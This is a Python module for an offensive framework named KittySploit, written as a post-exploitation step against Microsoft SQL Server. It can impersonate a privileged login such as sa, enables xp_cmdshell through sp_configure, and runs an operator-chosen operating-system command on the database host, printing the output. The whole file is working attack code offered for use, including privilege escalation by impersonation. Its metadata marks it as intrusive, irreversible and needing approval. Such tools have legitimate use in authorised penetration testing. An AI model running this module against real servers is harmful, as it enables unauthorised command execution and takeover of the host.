#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Enable xp_cmdshell and run OS commands (NetExec MSSQL xp_cmdshell chain)."""

from kittysploit import *
from lib.protocols.mssql.mssql_client import MSSQLClient


class Module(Post, MSSQLClient):
    __info__ = {
        "name": "MSSQL xp_cmdshell",
        "description": (
            "Optionally impersonate a login (e.g. sa), enable xp_cmdshell, and execute "
            "an OS command (NetExec: EXECUTE AS + sp_configure + xp_cmdshell)."
        ),
        "author": ["KittySploit Team"],
        "session_type": SessionType.MSSQL,
        "tags": ["mssql", "xp_cmdshell", "rce", "post", "netexec", "privesc"],
        "references": ["https://www.netexec.wiki/"],
        "agent": {
            "risk": "intrusive",
            "effects": ["active_exploitation", "host_modification"],
            "expected_requests": 4,
            "reversible": False,
            "approval_required": True,
            "produces": ["risk_signals"],
        },
    }

    impersonate = OptString(
        "",
        "Login to EXECUTE AS before enabling xp_cmdshell (e.g. sa)",
        False,
    )
    command = OptString(
        "whoami",
        "OS command to run via xp_cmdshell",
        True,
    )
    enable = OptBool(
        True,
        "Enable show advanced options + xp_cmdshell before running",
        False,
    )

    def run(self):
        try:
            impersonate = str(self.impersonate or "").strip()
            cmd = str(self.command or "whoami").strip()
            if not cmd:
                raise ProcedureError(FailureType.ConfigurationError, "command is required")

            prefix = ""
            suffix = ""
            if impersonate:
                safe = impersonate.replace("'", "''")
                prefix = f"EXECUTE AS LOGIN = '{safe}'; "
                suffix = "; REVERT"
                print_status(f"Impersonating login: {impersonate}")

            if self.enable:
                enable_sql = (
                    prefix
                    + "EXEC sp_configure 'show advanced options', 1; RECONFIGURE; "
                    + "EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE"
                    + suffix
                )
                print_status("Enabling xp_cmdshell...")
                try:
                    self.execute_query(enable_sql, fetch_all=False)
                    print_success("xp_cmdshell enabled")
                except Exception as exc:
                    print_warning(f"Enable may have failed (continuing): {exc}")

            safe_cmd = cmd.replace("'", "''")
            run_sql = prefix + f"EXEC xp_cmdshell '{safe_cmd}'" + suffix
            print_status(f"xp_cmdshell → {cmd}")
            rows = self.execute_query(run_sql) or []
            print_info("=" * 60)
            for row in rows:
                if isinstance(row, dict):
                    line = next(iter(row.values()), None)
                elif isinstance(row, (list, tuple)):
                    line = row[0]
                else:
                    line = row
                if line is None:
                    continue
                print_info(str(line))
            print_info("=" * 60)
            print_success("xp_cmdshell finished")
            return True
        except ProcedureError:
            raise
        except Exception as exc:
            print_error(str(exc))
            return False
